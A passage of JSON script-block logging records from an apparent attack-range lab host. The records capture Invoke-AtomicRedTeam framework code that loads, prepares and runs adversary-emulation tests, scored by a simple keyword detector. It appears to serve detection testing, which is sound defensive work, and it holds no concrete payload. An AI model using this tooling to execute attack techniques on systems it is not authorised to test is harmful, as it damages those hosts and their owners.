      "full_command": "function Get-InputArgs([hashtable]$ip, $customInputArgs, $PathToAtomicsFolder) {\n    $defaultArgs = @{ }\n    foreach ($key in $ip.Keys) {\n        $defaultArgs[$key] = $ip[$key].default\n    }\n    # overwrite defaults with any user supplied values\n    foreach ($key in $customInputArgs.Keys) {\n        if ($defaultArgs.Keys -contains $key) {\n            # replace default with user supplied\n            $defaultArgs.set_Item($key, $customInputArgs[$key])\n        }\n        else {\n            Write-Verbose \"The specified input argument *$key* was ignored as not applicable\"\n        }\n    }\n    $defaultArgs\n}\n\nfunction Merge-InputArgs($finalCommand, $test, $customInputArgs, $PathToAtomicsFolder) {\n    if (($null -ne $finalCommand) -and ($test.input_arguments.Count -gt 0)) {\n        Write-Verbose -Message 'Replacing inputArgs with user specified values, or default values if none provided'\n        $inputArgs = Get-InputArgs $test.input_arguments $customInputArgs $PathToAtomicsFolder\n\n        foreach ($key in $inputArgs.Keys) {\n            $findValue = '#{' + $key + '}'\n            $finalCommand = $finalCommand.Replace($findValue, $inputArgs[$key])\n        }\n    }\n\n    # Replace $PathToAtomicsFolder or PathToAtomicsFolder with the actual -PathToAtomicsFolder value\n    $finalCommand = ($finalCommand -replace \"\\`$PathToAtomicsFolder\", $PathToAtomicsFolder) -replace \"PathToAtomicsFolder\", $PathToAtomicsFolder\n\n    $finalCommand\n}\n\nfunction Invoke-PromptForInputArgs([hashtable]$ip) {\n    $InputArgs = @{ }\n    foreach ($key in $ip.Keys) {\n        $InputArgs[$key] = $ip[$key].default\n        $newValue = Read-Host -Prompt \"Enter a value for $key , or press enter to accept the default.`n$($ip[$key].description.trim()) [$($ip[$key].default.trim())]\"\n        # replace default with user supplied\n        if (-not [string]::IsNullOrWhiteSpace($newValue)) {\n            $InputArgs.set_Item($key, $newValue)\n        }\n    }\n    $InputArgs\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:57.2666973+00:00",
      "event_id": 35711103,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 1000,
      "full_command": "function Invoke-CheckPrereqs ($test, $isElevated, $executionPlatform, $customInputArgs, $PathToAtomicsFolder, $TimeoutSeconds, $session = $null) {\n    $FailureReasons = New-Object System.Collections.ArrayList\n    if ( $test.executor.elevation_required -and -not $isElevated) {\n        $FailureReasons.add(\"Elevation required but not provided`n\") | Out-Null\n    }\n    foreach ($dep in $test.dependencies) {\n        $executor = Get-PrereqExecutor $test\n        $final_command = Merge-InputArgs $dep.prereq_command $test $customInputArgs $PathToAtomicsFolder\n        if ($executor -ne \"powershell\") { $final_command = ($final_Command.trim()).Replace(\"`n\", \" && \") }\n        $res = Invoke-ExecuteCommand $final_command $executor $executionPlatform $TimeoutSeconds  $session\n        $description = Merge-InputArgs $dep.description $test $customInputArgs $PathToAtomicsFolder\n        if ($res.ExitCode -ne 0) {\n            $FailureReasons.add($description) | Out-Null\n        }\n    }\n    $FailureReasons\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:57.2600318+00:00",
      "event_id": 35711097,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 195,
      "full_command": "function Get-PrereqExecutor ($test) {\n    if ($nul -eq $test.dependency_executor_name) { $executor = $test.executor.name }\n    else { $executor = $test.dependency_executor_name }\n    $executor\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:57.2346727+00:00",
      "event_id": 35711080,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 426,
      "full_command": "function Invoke-KillProcessTree {\n    Param([int]$ppid)\n    if ($IsLinux -or $IsMacOS) {\n        sh -c \"pkill -9 -P $ppid\"\n    }\n    else {\n        while ($null -ne ($gcim = Get-CimInstance Win32_Process | Where-Object { $_.ParentProcessId -eq $ppid })) {\n            $gcim | ForEach-Object { Invoke-KillProcessTree $_.ProcessId; Start-Sleep -Seconds 0.5 }\n        }\n        Stop-Process -Id $ppid -ErrorAction Ignore\n    }\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:57.2234339+00:00",
      "event_id": 35711071,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 5227,
      "full_command": "athToPayloads\n                            $res = Invoke-ExecuteCommand $final_command_prereq $executor $executionPlatform $TimeoutSeconds $session -Interactive:$true\n\n                            if ($res.ExitCode -eq 0) {\n                                Write-KeyValue \"Prereq already met: \" $description\n                            }\n                            else {\n                                $res = Invoke-ExecuteCommand $final_command_get_prereq $executor $executionPlatform $TimeoutSeconds $session -Interactive:$Interactive\n                                $res = Invoke-ExecuteCommand $final_command_prereq $executor $executionPlatform $TimeoutSeconds $session -Interactive:$true\n                                if ($res.ExitCode -eq 0) {\n                                    Write-KeyValue \"Prereq successfully met: \" $description\n                                }\n                                else {\n                                    Write-Host -ForegroundColor Red \"Failed to meet prereq: $description\"\n                                }\n                            }\n                        }\n                    }\n                    elseif ($Cleanup) {\n                        Write-KeyValue \"Executing cleanup for test: \" $testId\n                        $final_command = Merge-InputArgs $test.executor.cleanup_command $test $InputArgs $PathToPayloads\n                        if (Get-Command 'Invoke-ARTPreAtomicCleanupHook' -errorAction SilentlyContinue) { Invoke-ARTPreAtomicCleanupHook $test $InputArgs }\n                        $res = Invoke-ExecuteCommand $final_command $test.executor.name $executionPlatform $TimeoutSeconds $session -Interactive:$Interactive\n                        Write-KeyValue \"Done executing cleanup for test: \" $testId\n                        if (Get-Command 'Invoke-ARTPostAtomicCleanupHook' -errorAction SilentlyContinue) { Invoke-ARTPostAtomicCleanupHook $test $InputArgs }\n                        if ($(Test-IncludesTerraform $AT $testCount)) {\n                            Remove-TerraformFiles $AT $testCount\n                        }\n                    }\n                    else {\n                        Write-KeyValue \"Executing test: \" $testId\n                        $startTime = Get-Date\n                        $final_command = Merge-InputArgs $test.executor.command $test $InputArgs $PathToPayloads\n                        if (Get-Command 'Invoke-ARTPreAtomicHook' -errorAction SilentlyContinue) { Invoke-ARTPreAtomicHook $test $InputArgs }\n                        $res = Invoke-ExecuteCommand $final_command $test.executor.name $executionPlatform $TimeoutSeconds $session -Interactive:$Interactive\n                        Write-Host \"Exit code: $($res.ExitCode)\"\n                        if (Get-Command 'Invoke-ARTPostAtomicHook' -errorAction SilentlyContinue) { Invoke-ARTPostAtomicHook $test $InputArgs }\n                        $stopTime = Get-Date\n                        if ($isLoggingModuleSet) {\n                            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {\n                                &\"$_\\Write-ExecutionLog\" $startTime $stopTime $AT $testCount $test.name $test.auto_generated_guid $test.executor.name $test.description $final_command $ExecutionLogPath $executionHostname $executionUser $res (-Not($IsLinux -or $IsMacOS))\n                            }\n                        }\n                        Write-KeyValue \"Done executing test: \" $testId\n                    }\n\n                } # End of foreach Test in single Atomic Technique\n            } # End of foreach Technique in Atomic Tests\n            if ($numAtomicsApplicableToPlatform -eq 0) {\n                Write-Host -ForegroundColor Yellow \"Found $numAtomicsApplicableToPlatform atomic tests applicable to $executionPlatform platform for Technique $techniqueString\"\n            }\n        } # End of Invoke-AtomicTestSingle function\n\n        if ($AtomicTechnique -eq \"All\") {\n            function Invoke-AllTests() {\n                $AllAtomicTests = New-Object System.Collections.ArrayList\n                Get-ChildItem $PathToAtomicsFolder -Directory -Filter T* | ForEach-Object {\n                    $currentTechnique = [System.IO.Path]::GetFileName($_.FullName)\n                    if ( $currentTechnique -match \"T[0-9]{4}.?([0-9]{3})?\" ) { $AllAtomicTests.Add($currentTechnique) | Out-Null }\n                }\n                $AllAtomicTests.GetEnumerator() | Foreach-Object { Invoke-AtomicTestSingle $_ }\n            }\n\n            if ( ($Force -or $CheckPrereqs -or $ShowDetails -or $ShowDetailsBrief -or $GetPrereqs) -or $psCmdlet.ShouldContinue( 'Do you wish to execute all tests?',\n                    \"Highway to the danger zone, Executing All Atomic Tests!\" ) ) {\n                Invoke-AllTests\n            }\n        }\n        else {\n            Invoke-AtomicTestSingle $AtomicTechnique\n        }\n\n        if ($isLoggingModuleSet) {\n            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {\n                &\"$_\\Stop-ExecutionLog\" $startTime $ExecutionLogPath $executionHostname $executionUser (-Not($IsLinux -or $IsMacOS))\n            }\n        }\n\n    } # End of PROCESS block\n    END { } # Intentionally left blank and can be removed\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 2,
      "message_total": 2,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:57.2234132+00:00",
      "event_id": 35711070,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 19031,
      "full_command": "function Invoke-AtomicTest {\n    [CmdletBinding(DefaultParameterSetName = 'technique',\n        SupportsShouldProcess = $true,\n        PositionalBinding = $false,\n        ConfirmImpact = 'Medium')]\n    Param(\n        [Parameter(Mandatory = $true,\n            Position = 0,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $AtomicTechnique,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $ShowDetails,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $ShowDetailsBrief,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $anyOS,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [String[]]\n        $TestNumbers,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [String[]]\n        $TestNames,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [String[]]\n        $TestGuids,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [String]\n        $PathToAtomicsFolder = $( if ($IsLinux -or $IsMacOS) { $Env:HOME + \"/AtomicRedTeam/atomics\" } else { $env:HOMEDRIVE + \"\\AtomicRedTeam\\atomics\" }),\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $CheckPrereqs = $false,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $PromptForInputArgs = $false,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $GetPrereqs = $false,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $Cleanup = $false,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [switch]\n        $NoExecutionLog = $false,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [String]\n        $ExecutionLogPath = $( if ($IsLinux -or $IsMacOS) { \"/tmp/Invoke-AtomicTest-ExecutionLog.csv\" } else { \"$env:TEMP\\Invoke-AtomicTest-ExecutionLog.csv\" }),\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [switch]\n        $Force,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [HashTable]\n        $InputArgs,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [Int]\n        $TimeoutSeconds = 120,\n\n        [Parameter(Mandatory = $false, ParameterSetName = 'technique')]\n        [System.Management.Automation.Runspaces.PSSession[]]$Session,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $Interactive = $false,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $KeepStdOutStdErrFiles = $false,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [String]\n        $LoggingModule,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [switch]\n        $SupressPathToAtomicsFolder = $false\n\n    )\n    BEGIN { } # Intentionally left blank and can be removed\n    PROCESS {\n        function ConvertTo-LoggerArray {\n            param (\n                [Parameter(Mandatory = $true)]\n                [string]$Loggers\n            )\n\n            return $Loggers -split ',' | ForEach-Object { $_.Trim() }\n        }\n\n        $PathToAtomicsFolder = (Resolve-Path $PathToAtomicsFolder).Path\n\n        Write-Verbose -Message 'Attempting to run Atomic Techniques'\n        if (-not $supressPathToAtomicsFolder) { Write-Host -ForegroundColor Cyan \"PathToAtomicsFolder = $PathToAtomicsFolder`n\" }\n\n        $executionPlatform, $isElevated, $tmpDir, $executionHostname, $executionUser = Get-TargetInfo $Session\n        $PathToPayloads = if ($Session) { \"$tmpDir`AtomicRedTeam\" }  else { $PathToAtomicsFolder }\n\n        # Since there might a comma(T1559-1,2,3) Powershell takes it as array.\n        # So converting it back to string.\n        if ($AtomicTechnique -is [array]) {\n            $AtomicTechnique = $AtomicTechnique -join \",\"\n        }\n\n        # Splitting Atomic Technique short form into technique and test numbers.\n        $AtomicTechniqueParams = ($AtomicTechnique -split '-')\n        $AtomicTechnique = $AtomicTechniqueParams[0]\n\n        if ($AtomicTechniqueParams.Length -gt 1) {\n            $ShortTestNumbers = $AtomicTechniqueParams[-1]\n        }\n\n        if ($null -eq $TestNumbers -and $null -ne $ShortTestNumbers) {\n            $TestNumbers = $ShortTestNumbers -split ','\n        }\n\n        $isLoggingModuleSet = $false\n        if (-not $NoExecutionLog) {\n            $isLoggingModuleSet = $true\n            if (-not $PSBoundParameters.ContainsKey('LoggingModule')) {\n                # no logging module explicitly set\n                # syslog logger\n                $syslogOptionsSet = [bool]$artConfig.syslogServer -and [bool]$artConfig.syslogPort\n                if ( $artConfig.LoggingModule -eq \"Syslog-ExecutionLogger\" -or (($artConfig.LoggingModule -eq '') -and $syslogOptionsSet) ) {\n                    if ($syslogOptionsSet) {\n                        $LoggingModule = \"Syslog-ExecutionLogger\"\n                    }\n                    else {\n                        Write-Host -Fore Yellow \"Config.ps1 specified: Syslog-ExecutionLogger, but the syslogServer and syslogPort must be specified. Using the default logger instead\"\n                        $LoggingModule = \"Default-ExecutionLogger\"\n                    }\n                }\n                elseif (-not [bool]$artConfig.LoggingModule) {\n                    # loggingModule is blank (not set), so use the default logger\n                    $LoggingModule = \"Default-ExecutionLogger\"\n                }\n                else {\n                    $LoggingModule = $artConfig.LoggingModule\n                }\n            }\n        }\n\n        if ($isLoggingModuleSet) {\n            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {\n                if (Get-Module -name $_) {\n                    Write-Verbose \"Using Logger: $_\"\n                }\n                else {\n                    Write-Host -Fore Yellow \"Logger not found: \", $_\n                }\n\n                # Change the defult logFile extension from csv to json and add a timestamp if using the Attire-ExecutionLogger\n                if ($_ -eq \"Attire-ExecutionLogger\") { $ExecutionLogPath = $ExecutionLogPath.Replace(\"Invoke-AtomicTest-ExecutionLog.csv\", \"Invoke-AtomicTest-ExecutionLog-timestamp.json\") }\n                $ExecutionLogPath = $ExecutionLogPath.Replace(\"timestamp\", $(Get-Date -UFormat %s))\n\n                if (Get-Command \"$_\\Start-ExecutionLog\" -erroraction silentlycontinue) {\n                    if (Get-Command \"$_\\Write-ExecutionLog\" -erroraction silentlycontinue) {\n                        if (Get-Command \"$_\\Stop-ExecutionLog\" -erroraction silentlycontinue) {\n                            Write-Verbose \"All logging commands found\"\n                        }\n                        else {\n                            Write-Host \"Stop-ExecutionLog not found or loaded from the wrong module\"\n                            return\n                        }\n                    }\n                    else {\n                        Write-Host \"Write-ExecutionLog not found or loaded from the wrong module\"\n                        return\n                    }\n                }\n                else {\n                    Write-Host \"Start-ExecutionLog not found or loaded from the wrong module\"\n                    return\n                }\n            }\n\n            # Here we're rebuilding an equivalent command line to put in the logs\n            $commandLine = \"Invoke-AtomicTest $AtomicTechnique\"\n\n            if ($ShowDetails -ne $false) {\n                $commandLine = \"$commandLine -ShowDetails $ShowDetails\"\n            }\n\n            if ($ShowDetailsBrief -ne $false) {\n                $commandLine = \"$commandLine -ShowDetailsBrief $ShowDetailsBrief\"\n            }\n\n            if ($null -ne $TestNumbers) {\n                $commandLine = \"$commandLine -TestNumbers $TestNumbers\"\n            }\n\n            if ($null -ne $TestNames) {\n                $commandLine = \"$commandLine -TestNames $TestNames\"\n            }\n\n            if ($null -ne $TestGuids) {\n                $commandLine = \"$commandLine -TestGuids $TestGuids\"\n            }\n\n            $commandLine = \"$commandLine -PathToAtomicsFolder $PathToAtomicsFolder\"\n\n            if ($CheckPrereqs -ne $false) {\n                $commandLine = \"$commandLine -CheckPrereqs $CheckPrereqs\"\n            }\n\n            if ($PromptForInputArgs -ne $false) {\n                $commandLine = \"$commandLine -PromptForInputArgs $PromptForInputArgs\"\n            }\n\n            if ($GetPrereqs -ne $false) {\n                $commandLine = \"$commandLine -GetPrereqs $GetPrereqs\"\n            }\n\n            if ($Cleanup -ne $false) {\n                $commandLine = \"$commandLine -Cleanup $Cleanup\"\n            }\n\n            if ($NoExecutionLog -ne $false) {\n                $commandLine = \"$commandLine -NoExecutionLog $NoExecutionLog\"\n            }\n\n            $commandLine = \"$commandLine -ExecutionLogPath $ExecutionLogPath\"\n\n            if ($Force -ne $false) {\n                $commandLine = \"$commandLine -Force $Force\"\n            }\n\n            if ($InputArgs -ne $null) {\n                $commandLine = \"$commandLine -InputArgs $InputArgs\"\n            }\n\n            $commandLine = \"$commandLine -TimeoutSeconds $TimeoutSeconds\"\n            if ($PSBoundParameters.ContainsKey('Session')) {\n                if ( $null -eq $Session ) {\n                    Write-Error \"The provided session is null and cannot be used.\"\n                    continue\n                }\n                else {\n                    $commandLine = \"$commandLine -Session $Session\"\n                }\n            }\n\n            if ($Interactive -ne $false) {\n                $commandLine = \"$commandLine -Interactive $Interactive\"\n            }\n\n            if ($KeepStdOutStdErrFiles -ne $false) {\n                $commandLine = \"$commandLine -KeepStdOutStdErrFiles $KeepStdOutStdErrFiles\"\n            }\n\n            if ($null -ne $LoggingModule) {\n                $commandLine = \"$commandLine -LoggingModule $LoggingModule\"\n            }\n\n            $startTime = Get-Date\n            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {\n                &\"$_\\Start-ExecutionLog\" $startTime $ExecutionLogPath $executionHostname $executionUser $commandLine (-Not($IsLinux -or $IsMacOS))\n            }\n        }\n\n        function Platform-IncludesCloud {\n            $cloud = ('office-365', 'azure-ad', 'google-workspace', 'saas', 'iaas', 'containers', 'iaas:aws', 'iaas:azure', 'iaas:gcp')\n            foreach ($platform in $test.supported_platforms) {\n                if ($cloud -contains $platform) {\n                    return $true\n                }\n            }\n            return $false\n        }\n\n        function Test-IncludesTerraform($AT, $testCount) {\n            $AT = $AT.ToUpper()\n            $pathToTerraform = Join-Path $PathToAtomicsFolder \"\\$AT\\src\\$AT-$testCount\\$AT-$testCount.tf\"\n            $cloud = ('iaas', 'containers', 'iaas:aws', 'iaas:azure', 'iaas:gcp')\n            foreach ($platform in $test.supported_platforms) {\n                if ($cloud -contains $platform) {\n                    return $(Test-Path -Path $pathToTerraform)\n                }\n            }\n            return $false\n        }\n\n        function Build-TFVars($AT, $testCount, $InputArgs) {\n            $tmpDirPath = Join-Path $PathToAtomicsFolder \"\\$AT\\src\\$AT-$testCount\"\n            if ($InputArgs) {\n                $destinationVarsPath = Join-Path \"$tmpDirPath\" \"terraform.tfvars.json\"\n                $InputArgs | ConvertTo-Json | Out-File -FilePath $destinationVarsPath\n            }\n        }\n\n        function Remove-TerraformFiles($AT, $testCount) {\n            $tmpDirPath = Join-Path $PathToAtomicsFolder \"\\$AT\\src\\$AT-$testCount\"\n            Write-Host $tmpDirPath\n            $tfStateFile = Join-Path $tmpDirPath \"terraform.tfstate\"\n            $tfvarsFile = Join-Path $tmpDirPath \"terraform.tfvars.json\"\n            if ($(Test-Path $tfvarsFile)) {\n                Remove-Item -LiteralPath $tfvarsFile -Force\n            }\n            if ($(Test-Path $tfStateFile)) {\n                (Get-ChildItem -Path $tmpDirPath).Fullname -match \"terraform.tfstate*\" | Remove-Item -Force\n            }\n        }\n\n        function Invoke-AtomicTestSingle ($AT) {\n\n            $AT = $AT.ToUpper()\n            $pathToYaml = Join-Path $PathToAtomicsFolder \"\\$AT\\$AT.yaml\"\n            if (Test-Path -Path $pathToYaml) { $AtomicTechniqueHash = Get-AtomicTechnique -Path $pathToYaml }\n            else {\n                Write-Host -Fore Red \"ERROR: $PathToYaml does not exist`nCheck your Atomic Number and your PathToAtomicsFolder parameter\"\n                return\n            }\n            $techniqueCount = 0\n            $numAtomicsApplicableToPlatform = 0\n            $techniqueString = \"\"\n            foreach ($technique in $AtomicTechniqueHash) {\n                $techniqueString = $technique.attack_technique[0]\n                $techniqueCount++\n\n                $props = @{\n                    Activity        = \"Running $($technique.display_name.ToString()) Technique\"\n                    Status          = 'Progress:'\n                    PercentComplete = ($techniqueCount / ($AtomicTechniqueHash).Count * 100)\n                }\n                Write-Progress @props\n\n                Write-Debug -Message \"Gathering tests for Technique $technique\"\n\n                $testCount = 0\n                foreach ($test in $technique.atomic_tests) {\n\n                    Write-Verbose -Message 'Determining tests for target platform'\n\n                    $testCount++\n\n                    if (-not $anyOS) {\n                        if ( -not $(Platform-IncludesCloud) -and -Not $test.supported_platforms.Contains($executionPlatform) ) {\n                            Write-Verbose -Message \"Unable to run non-$executionPlatform tests\"\n                            continue\n                        }\n\n                        if ( $executionPlatform -eq \"windows\" -and ($test.executor.name -eq \"sh\" -or $test.executor.name -eq \"bash\")) {\n                            Write-Verbose -Message \"Unable to run sh or bash on $executionPlatform\"\n                            continue\n                        }\n                        if ( (\"linux\", \"macos\") -contains $executionPlatform -and $test.executor.name -eq \"command_prompt\") {\n                            Write-Verbose -Message \"Unable to run cmd.exe on $executionPlatform\"\n                            continue\n                        }\n                    }\n\n\n                    if ($null -ne $TestNumbers) {\n                        if (-Not ($TestNumbers -contains $testCount) ) { continue }\n                    }\n\n                    if ($null -ne $TestNames) {\n                        if (-Not ($TestNames -contains $test.name) ) { continue }\n                    }\n\n                    if ($null -ne $TestGuids) {\n                        if (-Not ($TestGuids -contains $test.auto_generated_guid) ) { continue }\n                    }\n\n                    $props = @{\n                        Activity        = 'Running Atomic Tests'\n                        Status          = 'Progress:'\n                        PercentComplete = ($testCount / ($technique.atomic_tests).Count * 100)\n                    }\n                    Write-Progress @props\n\n                    Write-Verbose -Message 'Determining manual tests'\n\n                    if ($test.executor.name.Contains('manual')) {\n                        Write-Verbose -Message 'Unable to run manual tests'\n                        continue\n                    }\n                    $numAtomicsApplicableToPlatform++\n\n                    $testId = \"$AT-$testCount $($test.name)\"\n                    if ($ShowDetailsBrief) {\n                        Write-KeyValue $testId\n                        continue\n                    }\n\n                    if ($PromptForInputArgs) {\n                        $InputArgs = Invoke-PromptForInputArgs $test.input_arguments\n                    }\n\n                    if ($ShowDetails) {\n                        Show-Details $test $testCount $technique $InputArgs $PathToPayloads\n                        continue\n                    }\n\n                    Write-Debug -Message 'Gathering final Atomic test command'\n\n\n                    if ($CheckPrereqs) {\n                        Write-KeyValue \"CheckPrereq's for: \" $testId\n                        $failureReasons = Invoke-CheckPrereqs $test $isElevated $executionPlatform $InputArgs $PathToPayloads $TimeoutSeconds $session\n                        Write-PrereqResults $FailureReasons $testId\n                    }\n                    elseif ($GetPrereqs) {\n                        if ($(Test-IncludesTerraform $AT $testCount)) {\n                            Build-TFVars $AT $testCount $InputArgs\n                        }\n                        Write-KeyValue \"GetPrereq's for: \" $testId\n                        if ( $test.executor.elevation_required -and -not $isElevated) {\n                            Write-Host -ForegroundColor Red \"Elevation required but not provided\"\n                        }\n                        if ($nul -eq $test.dependencies) { Write-KeyValue \"No Preqs Defined\"; continue }\n                        foreach ($dep in $test.dependencies) {\n                            $executor = Get-PrereqExecutor $test\n                            $description = (Merge-InputArgs $dep.description $test $InputArgs $PathToPayloads).trim()\n                            Write-KeyValue  \"Attempting to satisfy prereq: \" $description\n                            $final_command_prereq = Merge-InputArgs $dep.prereq_command $test $InputArgs $PathToPayloads\n                            if ($executor -ne \"powershell\") { $final_command_prereq = ($final_command_prereq.trim()).Replace(\"`n\", \" && \") }\n                            $final_command_get_prereq = Merge-InputArgs $dep.get_prereq_command $test $InputArgs $P",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 2,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:54.3265388+00:00",
      "event_id": 35710521,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 1359,
      "full_command": "function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {\n\n}\n\nfunction Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {\n    if (!(Test-Path $logPath)) {\n        New-Item $logPath -Force -ItemType File | Out-Null\n    }\n    $ipAddress = Get-PreferredIPAddress $isWindows\n    $timeUTC = (Get-Date($startTime).toUniversalTime() -uformat \"%Y-%m-%dT%H:%M:%SZ\").ToString()\n    $timeLocal = (Get-Date($startTime) -uformat \"%Y-%m-%dT%H:%M:%SZ\").ToString()\n    $msg = [PSCustomObject][ordered]@{\n        \"Execution Time (UTC)\"   = $timeUTC\n        \"Execution Time (Local)\" = $timeLocal\n        \"Technique\"              = $technique\n        \"Test Number\"            = $testNum\n        \"Test Name\"              = $testName\n        \"Hostname\"               = $targetHostname\n        \"IP Address\"             = $ipAddress\n        \"Username\"               = $targetUser\n        \"GUID\"                   = $testGuid\n        \"ProcessId\"              = $res.ProcessId\n        \"ExitCode\"               = $res.ExitCode\n    }\n\n    $msg | Export-Csv -Path $LogPath -NoTypeInformation -Append\n}\n\nfunction Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {\n\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:54.3330482+00:00",
      "event_id": 35710524,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 6031,
      "full_command": "# Attire-ExecutionLogger.psm1\n# Copyright 2023 Security Risk Advisors\n\n# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the â€œSoftwareâ€),\n# to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,\n# and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:\n\n# The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.\n\n# THE SOFTWARE IS PROVIDED â€œAS ISâ€, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n#  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,\n#  WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n\n$script:attireLog = [PSCustomObject]@{\n    'attire-version' = '1.1'\n    'execution-data' = ''\n    'procedures'     = @()\n}\n\nfunction Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {\n\n    $ipAddress = Get-PreferredIPAddress $isWindows\n\n    if ($targetUser -isnot [string]) {\n        if ([bool]($targetUser.PSobject.Properties.name -match \"^value$\")) {\n            $targetUser = $targetUser.value\n        }\n        else {\n            $targetUser = $targetUser.ToString()\n        }\n    }\n    if ($targetHostname -isnot [string]) {\n        if ([bool]($targetHostname.PSobject.Properties.name -match \"^value$\")) {\n            $targetHostname = $targetHostname.value\n        }\n        else {\n            $targetHostname = $targetHostname.ToString()\n        }\n    }\n\n    $target = [PSCustomObject]@{\n        user = $targetUser\n        host = $targetHostname\n        ip   = $ipAddress\n        path = $Env:PATH\n    }\n\n    $guid = New-Guid\n    $bytes = [System.Text.Encoding]::UTF8.GetBytes($guid.Guid)\n    $executionId = [Convert]::ToBase64String($bytes)\n\n    $executionCategory = [PSCustomObject]@{\n        'name'         = \"Atomic Red Team\"\n        'abbreviation' = \"ART\"\n    }\n\n    $executionData = [PSCustomObject]@{\n        'execution-source'   = \"Invoke-Atomicredteam\"\n        'execution-id'       = 